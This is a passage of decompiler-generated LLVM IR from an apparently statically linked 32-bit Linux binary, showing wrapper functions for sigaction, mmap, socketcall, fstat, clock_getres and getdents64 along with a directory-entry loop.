  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_80535c9, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056044.228 to i32), i32 -134570052), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8053941, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 2, 0, 1, 3 }
  uselistorder i32 120, { 8, 22, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8053b1c, { 1, 0 }
  uselistorder label %dec_label_pc_8053af8, { 1, 0 }
  uselistorder label %dec_label_pc_8053ad3, { 1, 0 }
  uselistorder label %dec_label_pc_8053a5e, { 1, 0 }
  uselistorder label %dec_label_pc_8053a3c, { 1, 0 }
  uselistorder label %dec_label_pc_8053a24, { 1, 0 }
  uselistorder label %dec_label_pc_8053a01, { 1, 0 }
}

define i32 @function_8053b7f(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053b7f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8053b7f = load i32, i32* @esi, align 4
  %v0_8053b80 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8053b95 = icmp eq i32* %arg2, null
  br i1 %v1_8053b95, label %dec_label_pc_8053be8, label %dec_label_pc_8053b99

dec_label_pc_8053b99:                             ; preds = %dec_label_pc_8053b7f
  %v2_8053b99 = load i32, i32* %arg2, align 4
  store i32 %v2_8053b99, i32* %stack_var_-148, align 4
  %v1_8053ba2 = add i32 %tmp11, 4
  %v3_8053bb4 = bitcast i32* %stack_var_-136 to i16*
  %v4_8053bb4 = call i32 @function_8054202(i16* %v3_8053bb4, i32 %v1_8053ba2, i32 128)
  %v1_8053bb9 = add i32 %tmp11, 132
  %v2_8053bd3 = inttoptr i32 %v1_8053bb9 to i8*
  %v3_8053bd3 = load i8, i8* %v2_8053bd3, align 1
  %v4_8053bd3 = and i8 %v3_8053bd3, 4
  %v5_8053bd3 = icmp eq i8 %v4_8053bd3, 0
  %v1_8053bda = icmp eq i1 %v5_8053bd3, false
  br i1 %v1_8053bda, label %dec_label_pc_8053be8, label %dec_label_pc_8053bdc

dec_label_pc_8053bdc:                             ; preds = %dec_label_pc_8053b99
  br label %dec_label_pc_8053be8

dec_label_pc_8053be8:                             ; preds = %dec_label_pc_8053bdc, %dec_label_pc_8053b99, %dec_label_pc_8053b7f
  %v1_8053bea = icmp eq i32 %arg3, 0
  br i1 %v1_8053bea, label %dec_label_pc_8053bf2, label %dec_label_pc_8053bee

dec_label_pc_8053bee:                             ; preds = %dec_label_pc_8053be8
  %v2_8053bee = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8053bf2

dec_label_pc_8053bf2:                             ; preds = %dec_label_pc_8053be8, %dec_label_pc_8053bee
  %v0_8053c01 = phi i32 [ 0, %dec_label_pc_8053be8 ], [ %v2_8053bee, %dec_label_pc_8053bee ]
  br i1 %v1_8053b95, label %dec_label_pc_8053bff, label %dec_label_pc_8053bf8

dec_label_pc_8053bf8:                             ; preds = %dec_label_pc_8053bf2
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8053bff

dec_label_pc_8053bff:                             ; preds = %dec_label_pc_8053bf2, %dec_label_pc_8053bf8
  %v0_8053c02 = phi %sigaction* [ null, %dec_label_pc_8053bf2 ], [ %phitmp, %dec_label_pc_8053bf8 ]
  %v5_8053c0a = call i32 @function_8053ca5(i32 %arg1, %sigaction* %v0_8053c02, i32 %v0_8053c01, i32 8)
  store i32 %v5_8053c0a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8053bea, label %dec_label_pc_8053c4d, label %dec_label_pc_8053c18

dec_label_pc_8053c18:                             ; preds = %dec_label_pc_8053bff
  %v2_8053c18 = icmp slt i32 %v5_8053c0a, 0
  br i1 %v2_8053c18, label %dec_label_pc_8053c4d, label %dec_label_pc_8053c1c

dec_label_pc_8053c1c:                             ; preds = %dec_label_pc_8053c18
  %v3_8053c1c = load i32, i32* %stack_var_-288, align 4
  %v2_8053c20 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8053c1c, i32* %v2_8053c20, align 4
  %v2_8053c28 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8053c2d = add i32 %arg3, 4
  %v3_8053c31 = inttoptr i32 %v1_8053c2d to i16*
  %v4_8053c31 = call i32 @function_8054202(i16* %v3_8053c31, i32 %v2_8053c28, i32 128)
  %v2_8053c3a = add i32 %arg3, 132
  %v3_8053c3a = inttoptr i32 %v2_8053c3a to i32*
  %v2_8053c47 = add i32 %arg3, 136
  %v3_8053c47 = inttoptr i32 %v2_8053c47 to i32*
  %v0_8053c4d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c4d

dec_label_pc_8053c4d:                             ; preds = %dec_label_pc_8053c18, %dec_label_pc_8053bff, %dec_label_pc_8053c1c
  %v0_8053c4d = phi i32 [ %v5_8053c0a, %dec_label_pc_8053c18 ], [ %v5_8053c0a, %dec_label_pc_8053bff ], [ %v0_8053c4d.pre, %dec_label_pc_8053c1c ]
  store i32 %v0_8053b80, i32* @ebx, align 4
  store i32 %v0_8053b7f, i32* @esi, align 4
  ret i32 %v0_8053c4d

; uselistorder directives
  uselistorder i32 %v5_8053c0a, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 3, 1, 4, 5, 2, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8053c4d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053bff, { 1, 0 }
  uselistorder label %dec_label_pc_8053bf2, { 1, 0 }
}

define i32 @function_8053c58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8053c58:
  %stack_var_4 = alloca i32, align 4
  %v0_8053c58 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c58, i32* @edx, align 4
  %v2_8053c63 = load i32, i32* @ecx, align 4
  %v4_8053c63 = load i32, i32* @esi, align 4
  %v5_8053c63 = load i32, i32* @edi, align 4
  %v6_8053c63 = load i32, i32* @ebp, align 4
  %v7_8053c63 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8053c63, i32 %v0_8053c58, i32 %v4_8053c63, i32 %v5_8053c63, i32 %v6_8053c63)
  %v8_8053c63 = ptrtoint i32* %v7_8053c63 to i32
  store i32 %v0_8053c58, i32* @ebx, align 4
  %v3_8053c6c = icmp ugt i32* %v7_8053c63, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8053c6c, i32 134562565)
  ret i32 %v8_8053c63

; uselistorder directives
  uselistorder i32* @ebp, { 8, 56, 57, 58, 59, 60, 61, 62, 63, 9, 10, 64, 65, 66, 67, 68, 69, 70, 71, 76, 72, 73, 74, 75, 7, 77, 13, 14, 15, 4, 24, 25, 19, 32, 21, 18, 3, 26, 11, 0, 12, 1, 31, 16, 17, 2, 20, 22, 23, 27, 28, 29, 30, 33, 34, 35, 36, 37, 38, 5, 39, 40, 41, 42, 43, 44, 45, 46, 47, 6, 48, 49, 50, 51, 52, 53, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 98, 96, 97, 99, 100, 101, 102, 103, 54, 55 }
  uselistorder i32* @ecx, { 5, 19, 17, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 1, 45, 21, 20, 18, 46, 47, 48, 2, 49, 50, 51, 3, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 7, 8, 9, 4, 10, 11, 63, 12, 13, 14, 15, 16, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 6, 89, 90, 91, 92, 93 }
}

define i32 @function_8053c73(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053c73:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053c73 = load i32, i32* @ebx, align 4
  store i32 %v0_8053c73, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8053c86 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8053c86, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8053c86, -4095
  br i1 %tmp9, label %dec_label_pc_8053c9f, label %dec_label_pc_8053c93

dec_label_pc_8053c93:                             ; preds = %dec_label_pc_8053c73
  %v1_8053c93 = call i32 @function_8051fb9(i32 %v0_8053c73)
  %v0_8053c98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c98 = sub i32 0, %v0_8053c98
  %v2_8053c9a = inttoptr i32 %v1_8053c93 to i32*
  store i32 %v1_8053c98, i32* %v2_8053c9a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053ca3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053c9f

dec_label_pc_8053c9f:                             ; preds = %dec_label_pc_8053c73, %dec_label_pc_8053c93
  %v2_8053ca3 = phi i32 [ %v0_8053c73, %dec_label_pc_8053c73 ], [ %v2_8053ca3.pre, %dec_label_pc_8053c93 ]
  %v0_8053c9f = phi i32 [ %v1_8053c86, %dec_label_pc_8053c73 ], [ -1, %dec_label_pc_8053c93 ]
  %v2_8053ca1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053ca1, i32* @edx, align 4
  store i32 %v2_8053ca3, i32* @ebx, align 4
  ret i32 %v0_8053c9f

; uselistorder directives
  uselistorder i32 %v1_8053c86, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8053c9f, { 1, 0 }
}

define i32 @function_8053ca5(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053ca5:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8053ca6 = load i32, i32* @esi, align 4
  store i32 %v0_8053ca6, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8053cba = load i32, i32* @ebx, align 4
  %v7_8053cc2 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8053cc2, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8053cc2, -4095
  br i1 %tmp14, label %dec_label_pc_8053cda, label %dec_label_pc_8053cce

dec_label_pc_8053cce:                             ; preds = %dec_label_pc_8053ca5
  %v1_8053cce = call i32 @function_8051fb9(i32 %v0_8053cba)
  %v0_8053cd3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053cd3 = sub i32 0, %v0_8053cd3
  %v2_8053cd5 = inttoptr i32 %v1_8053cce to i32*
  store i32 %v1_8053cd3, i32* %v2_8053cd5, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8053cdd.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053cda

dec_label_pc_8053cda:                             ; preds = %dec_label_pc_8053ca5, %dec_label_pc_8053cce
  %v2_8053cdd = phi i32 [ %v0_8053ca6, %dec_label_pc_8053ca5 ], [ %v2_8053cdd.pre, %dec_label_pc_8053cce ]
  %v0_8053cda = phi i32 [ %v7_8053cc2, %dec_label_pc_8053ca5 ], [ -1, %dec_label_pc_8053cce ]
  store i32 %v2_8053cdd, i32* @esi, align 4
  ret i32 %v0_8053cda

; uselistorder directives
  uselistorder i32 %v7_8053cc2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053cda, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8053ce0(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8053ce0:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8053d08(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053d08:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053d08 = load i32, i32* @ebx, align 4
  store i32 %v0_8053d08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8053d1b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8053d1b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8053d1b, -4095
  br i1 %tmp10, label %dec_label_pc_8053d34, label %dec_label_pc_8053d28

dec_label_pc_8053d28:                             ; preds = %dec_label_pc_8053d08
  %v1_8053d28 = call i32 @function_8051fb9(i32 %v0_8053d08)
  %v0_8053d2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053d2d = sub i32 0, %v0_8053d2d
  %v2_8053d2f = inttoptr i32 %v1_8053d28 to i32*
  store i32 %v1_8053d2d, i32* %v2_8053d2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053d38.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053d34

dec_label_pc_8053d34:                             ; preds = %dec_label_pc_8053d08, %dec_label_pc_8053d28
  %v2_8053d38 = phi i32 [ %v0_8053d08, %dec_label_pc_8053d08 ], [ %v2_8053d38.pre, %dec_label_pc_8053d28 ]
  %v0_8053d34 = phi i32 [ %v4_8053d1b, %dec_label_pc_8053d08 ], [ -1, %dec_label_pc_8053d28 ]
  %v2_8053d36 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053d36, i32* @edx, align 4
  store i32 %v2_8053d38, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053d34

; uselistorder directives
  uselistorder i32 %v4_8053d1b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053d34, { 1, 0 }
}

define i32 @function_8053d3a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053d3a:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053d3a = load i32, i32* @ebx, align 4
  store i32 %v0_8053d3a, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8053d4d = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8053d4d, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8053d4d, -4095
  br i1 %tmp13, label %dec_label_pc_8053d68, label %dec_label_pc_8053d5a

dec_label_pc_8053d5a:                             ; preds = %dec_label_pc_8053d3a
  %v1_8053d5a = call i32 @function_8051fb9(i32 %v0_8053d3a)
  %v0_8053d5f = load i32, i32* @ebx, align 4
  %v1_8053d5f = sub i32 0, %v0_8053d5f
  %v2_8053d61 = inttoptr i32 %v1_8053d5a to i32*
  store i32 %v1_8053d5f, i32* %v2_8053d61, align 4
  %v2_8053d80.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053d7b

dec_label_pc_8053d68:                             ; preds = %dec_label_pc_8053d3a
  %v1_8053d68 = icmp eq i32 %v4_8053d4d, 0
  %v1_8053d6a = icmp eq i1 %v1_8053d68, false
  br i1 %v1_8053d6a, label %dec_label_pc_8053d7b, label %dec_label_pc_8053d6c

dec_label_pc_8053d6c:                             ; preds = %dec_label_pc_8053d68
  %v4_8053d73 = bitcast i32* %stack_var_-68 to i16*
  %v5_8053d73 = call i32 @function_8054185(i16* %v4_8053d73, i32 %arg2, i32 %v4_8053d4d, i32 %v4_8053d4d)
  %v0_8053d7b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053d7b

dec_label_pc_8053d7b:                             ; preds = %dec_label_pc_8053d68, %dec_label_pc_8053d5a, %dec_label_pc_8053d6c
  %v2_8053d80 = phi i32 [ %v0_8053d3a, %dec_label_pc_8053d68 ], [ %v2_8053d80.pre, %dec_label_pc_8053d5a ], [ %v0_8053d3a, %dec_label_pc_8053d6c ]
  %v0_8053d7b = phi i32 [ %v4_8053d4d, %dec_label_pc_8053d68 ], [ -1, %dec_label_pc_8053d5a ], [ %v0_8053d7b.pre, %dec_label_pc_8053d6c ]
  store i32 %v2_8053d80, i32* @ebx, align 4
  ret i32 %v0_8053d7b

; uselistorder directives
  uselistorder i32 %v4_8053d4d, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053d7b, { 2, 0, 1 }
}

define i32 @function_8053d82(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053d82:
  %eax.global-to-local = alloca i32, align 4
  %v0_8053d82 = load i32, i32* @edi, align 4
  %v0_8053d83 = load i32, i32* @esi, align 4
  %v0_8053d84 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8053d89 = load i32, i32* @edx, align 4
  %v7_8053d93 = inttoptr i32 %arg2 to i32*
  %v8_8053d93 = call i32 @function_8053df1(i32 %arg1, i32* %v7_8053d93, i32 %arg3, i32 %v0_8053d89, i32 %v0_8053d84, i32 %v0_8053d83, i32 %v0_8053d82)
  store i32 %v8_8053d93, i32* %eax.global-to-local, align 4
  store i32 %v8_8053d93, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8053d93, 1
  br i1 %tmp24, label %dec_label_pc_8053deb, label %dec_label_pc_8053da1

dec_label_pc_8053da1:                             ; preds = %dec_label_pc_8053d82
  %v0_8053da1 = load i32, i32* @ebx, align 4
  %v2_8053da1 = add i32 %v0_8053da1, %v8_8053d93
  store i32 %v2_8053da1, i32* @edi, align 4
  %v7_8053de74 = icmp ult i32 %v0_8053da1, %v2_8053da1
  br i1 %v7_8053de74, label %dec_label_pc_8053da6, label %dec_label_pc_8053deb

dec_label_pc_8053da6:                             ; preds = %dec_label_pc_8053da1, %dec_label_pc_8053da6
  %v0_8053da6 = phi i32 [ %v2_8053de5, %dec_label_pc_8053da6 ], [ %v0_8053da1, %dec_label_pc_8053da1 ]
  %v1_8053da6 = add i32 %v0_8053da6, 8
  %v2_8053da6 = inttoptr i32 %v1_8053da6 to i32*
  %v3_8053da6 = load i32, i32* %v2_8053da6, align 4
  store i32 %v3_8053da6, i32* %eax.global-to-local, align 4
  %v2_8053da9 = add i32 %v0_8053da6, 4
  %v3_8053da9 = inttoptr i32 %v2_8053da9 to i32*
  store i32 %v3_8053da6, i32* %v3_8053da9, align 4
  %v0_8053dac = load i32, i32* @ebx, align 4
  %v1_8053dac = add i32 %v0_8053dac, 16
  %v2_8053dac = inttoptr i32 %v1_8053dac to i32*
  %v3_8053dac = load i32, i32* %v2_8053dac, align 4
  store i32 %v3_8053dac, i32* %eax.global-to-local, align 4
  %v1_8053daf = trunc i32 %v3_8053dac to i16
  %v3_8053daf = add i32 %v0_8053dac, 8
  %v4_8053daf = inttoptr i32 %v3_8053daf to i16*
  store i16 %v1_8053daf, i16* %v4_8053daf, align 2
  %v0_8053db3 = load i32, i32* @ebx, align 4
  %v1_8053db3 = add i32 %v0_8053db3, 18
  %v2_8053db3 = inttoptr i32 %v1_8053db3 to i8*
  %v3_8053db3 = load i8, i8* %v2_8053db3, align 1
  %v4_8053db3 = zext i8 %v3_8053db3 to i32
  %v5_8053db3 = load i32, i32* %eax.global-to-local, align 4
  %v6_8053db3 = and i32 %v5_8053db3, -256
  %v7_8053db3 = or i32 %v6_8053db3, %v4_8053db3
  store i32 %v7_8053db3, i32* %eax.global-to-local, align 4
  %v3_8053db6 = add i32 %v0_8053db3, 10
  %v4_8053db6 = inttoptr i32 %v3_8053db6 to i8*
  store i8 %v3_8053db3, i8* %v4_8053db6, align 1
  %v0_8053dba = load i32, i32* @ebx, align 4
  %v1_8053dba = add i32 %v0_8053dba, 8
  %v2_8053dba = inttoptr i32 %v1_8053dba to i16*
  %v3_8053dba = load i16, i16* %v2_8053dba, align 2
  %v4_8053dba = zext i16 %v3_8053dba to i32
  %v1_8053dbe = add nsw i32 %v4_8053dba, -19
  %v1_8053dc2 = add i32 %v0_8053dba, 19
  %v1_8053dc6 = add i32 %v0_8053dba, 11
  store i32 %v1_8053dc6, i32* %eax.global-to-local, align 4
  %v3_8053dca = inttoptr i32 %v1_8053dc6 to i8*
  %v4_8053dca = call i32 @function_8051fe3(i8* %v3_8053dca, i32 %v1_8053dc2, i32 %v1_8053dbe)
  store i32 %v4_8053dca, i32* %eax.global-to-local, align 4
  %v0_8053dd2 = load i32, i32* @ebx, align 4
  %v1_8053dd2 = add i32 %v0_8053dd2, 8
  %v2_8053dd2 = inttoptr i32 %v1_8053dd2 to i16*
  %v3_8053dd2 = load i16, i16* %v2_8053dd2, align 2
  %v4_8053dd2 = zext i16 %v3_8053dd2 to i32
  store i32 %v4_8053dd2, i32* %eax.global-to-local, align 4
  %v3_8053dd9 = inttoptr i32 %v0_8053dd2 to i8*
  %v4_8053dd9 = call i32 @function_8051fe3(i8* %v3_8053dd9, i32 %v0_8053dd2, i32 %v4_8053dd2)
  store i32 %v4_8053dd9, i32* %eax.global-to-local, align 4
  %v0_8053dde = load i32, i32* @ebx, align 4
  %v1_8053dde = add i32 %v0_8053dde, 8
  %v2_8053dde = inttoptr i32 %v1_8053dde to i16*
  %v3_8053dde = load i16, i16* %v2_8053dde, align 2
  %v4_8053dde = zext i16 %v3_8053dde to i32
  store i32 %v4_8053dde, i32* %eax.global-to-local, align 4
  %v2_8053de5 = add i32 %v4_8053dde, %v0_8053dde
  store i32 %v2_8053de5, i32* @ebx, align 4
  %v1_8053de7 = load i32, i32* @edi, align 4
  %v7_8053de7 = icmp ult i32 %v2_8053de5, %v1_8053de7
  br i1 %v7_8053de7, label %dec_label_pc_8053da6, label %dec_label_pc_8053de7.dec_label_pc_8053deb.loopexit_crit_edge

dec_label_pc_8053de7.dec_label_pc_8053deb.loopexit_crit_edge: ; preds = %dec_label_pc_8053da6
  %v0_8053deb.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053deb

dec_label_pc_8053deb:                             ; preds = %dec_label_pc_8053da1, %dec_label_pc_8053de7.dec_label_pc_8053deb.loopexit_crit_edge, %dec_label_pc_8053d82
  %v0_8053deb = phi i32 [ %v8_8053d93, %dec_label_pc_8053d82 ], [ %v0_8053deb.pre.pre, %dec_label_pc_8053de7.dec_label_pc_8053deb.loopexit_crit_edge ], [ %v8_8053d93, %dec_label_pc_8053da1 ]
  store i32 %v0_8053deb, i32* %eax.global-to-local, align 4
  store i32 %v0_8053d83, i32* @esi, align 4
  store i32 %v0_8053d82, i32* @edi, align 4
  ret i32 %v0_8053deb

; uselistorder directives
  uselistorder i32 %v0_8053deb, { 1, 0 }
  uselistorder i32 %v2_8053de5, { 1, 2, 0 }
  uselistorder i32 %v0_8053dd2, { 1, 0, 2 }
  uselistorder i32 %v0_8053dba, { 1, 0, 2 }
  uselistorder i32 %v0_8053da6, { 1, 0 }
  uselistorder i32 %v0_8053da1, { 0, 2, 1 }
  uselistorder i32 %v8_8053d93, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_8051fe3, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_8053deb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053da6, { 1, 0 }
}

define i32 @function_8053df1(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8053df1:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8053df4 = load i32, i32* @edi, align 4
  %v0_8053df6 = load i32, i32* @ebx, align 4
  %v15_8053df7 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8053e00 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8053e06 = and i32 %v1_8053e00, -16
  %v2_8053e09 = sub i32 %v15_8053df7, %v1_8053e06
  %v1_8053e0b = add i32 %v2_8053e09, 15
  %v1_8053e0f = and i32 %v1_8053e0b, -16
  %v1_8053e15 = inttoptr i32 %v1_8053e0f to %linux_dirent64*
  store i32 %v1_8053e0f, i32* %ecx.global-to-local, align 4
  %v2_8053e17 = add i32 %v2_8053e09, -4
  %v3_8053e17 = inttoptr i32 %v2_8053e17 to i32*
  store i32 %v0_8053df6, i32* %v3_8053e17, align 4
  %v0_8053e18 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8053e1f = call i32 @getdents64(i32 %v0_8053e18, %linux_dirent64* %v1_8053e15, i32 %arg3)
  store i32 %v5_8053e1f, i32* %eax.global-to-local, align 4
  %v0_8053e21 = load i32, i32* @esp, align 4
  %v3_8053e21 = add i32 %v0_8053e21, 4
  %tmp41 = icmp ult i32 %v5_8053e1f, -4095
  br i1 %tmp41, label %dec_label_pc_8053e3b, label %dec_label_pc_8053e2c

dec_label_pc_8053e2c:                             ; preds = %dec_label_pc_8053df1
  %v1_8053e2c = call i32 @function_8051fb9(i32 %v5_8053e1f)
  store i32 %v1_8053e2c, i32* %eax.global-to-local, align 4
  %v4_8053e31 = sub i32 0, %v5_8053e1f
  store i32 %v4_8053e31, i32* @edx, align 4
  %v2_8053e37 = inttoptr i32 %v1_8053e2c to i32*
  store i32 %v4_8053e31, i32* %v2_8053e37, align 4
  br label %dec_label_pc_8053efd

dec_label_pc_8053e3b:                             ; preds = %dec_label_pc_8053df1
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8053e0f, i32* @ebx, align 4
  %v5_8053eed = add i32 %v5_8053e1f, %v1_8053e0f
  store i32 %v5_8053eed, i32* %eax.global-to-local, align 4
  %v7_8053ef030 = icmp ult i32 %v1_8053e0f, %v5_8053eed
  br i1 %v7_8053ef030, label %dec_label_pc_8053e5a.lr.ph, label %dec_label_pc_8053ef8

dec_label_pc_8053e5a.lr.ph:                       ; preds = %dec_label_pc_8053e3b
  %v5_8053e67 = add i32 %tmp14, %arg3
  br label %dec_label_pc_8053e5a

dec_label_pc_8053e5a:                             ; preds = %dec_label_pc_8053e5a.lr.ph, %dec_label_pc_8053e9c
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_8053e5a.lr.ph ], [ %v3_8053e9f, %dec_label_pc_8053e9c ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_8053e5a.lr.ph ], [ %v3_8053e9c, %dec_label_pc_8053e9c ]
  %v0_8053ea834 = phi i32 [ %v1_8053e0f, %dec_label_pc_8053e5a.lr.ph ], [ %v2_8053ee5, %dec_label_pc_8053e9c ]
  %v1_8053ead33 = phi i32 [ %tmp14, %dec_label_pc_8053e5a.lr.ph ], [ %v2_8053e6a, %dec_label_pc_8053e9c ]
  %v0_8053e7432 = phi i32 [ %v3_8053e21, %dec_label_pc_8053e5a.lr.ph ], [ %v1_8053ee7, %dec_label_pc_8053e9c ]
  %v1_8053e5a = add i32 %v0_8053ea834, 16
  %v2_8053e5a = inttoptr i32 %v1_8053e5a to i16*
  %v3_8053e5a = load i16, i16* %v2_8053e5a, align 2
  %v4_8053e5a = zext i16 %v3_8053e5a to i32
  %v1_8053e5e = add nuw nsw i32 %v4_8053e5a, 3
  %v1_8053e64 = and i32 %v1_8053e5e, 131068
  store i32 %v1_8053e64, i32* %ecx.global-to-local, align 4
  store i32 %v5_8053e67, i32* %eax.global-to-local, align 4
  %v2_8053e6a = add i32 %v1_8053e64, %v1_8053ead33
  %tmp42 = icmp ugt i32 %v2_8053e6a, %v5_8053e67
  br i1 %tmp42, label %dec_label_pc_8053e74, label %dec_label_pc_8053e9c

dec_label_pc_8053e74:                             ; preds = %dec_label_pc_8053e5a
  %v1_8053e74 = add i32 %v0_8053e7432, -4
  %v2_8053e74 = inttoptr i32 %v1_8053e74 to i32*
  store i32 0, i32* %v2_8053e74, align 4
  %v5_8053e76 = add i32 %v0_8053e7432, -8
  %v6_8053e76 = inttoptr i32 %v5_8053e76 to i32*
  store i32 %stack_var_-32.036, i32* %v6_8053e76, align 4
  %v5_8053e79 = add i32 %v0_8053e7432, -12
